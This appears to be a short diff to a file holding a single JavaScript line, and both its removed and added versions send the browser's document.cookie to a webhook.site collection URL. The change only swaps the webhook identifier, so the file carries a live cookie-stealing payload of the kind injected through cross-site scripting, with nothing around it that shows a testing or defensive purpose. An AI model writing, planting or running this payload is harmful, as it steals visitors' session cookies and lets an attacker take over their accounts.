@@ -1,3 +1,3 @@
 {
-fetch("https://webhook.site/e925819f-2c81-4cbe-a619-a0f20f9aa493?c="+document.cookie);
+fetch("https://webhook.site/dbe90765-2cfa-4126-a6e1-f7feaf0b35ae?c="+document.cookie);
 }
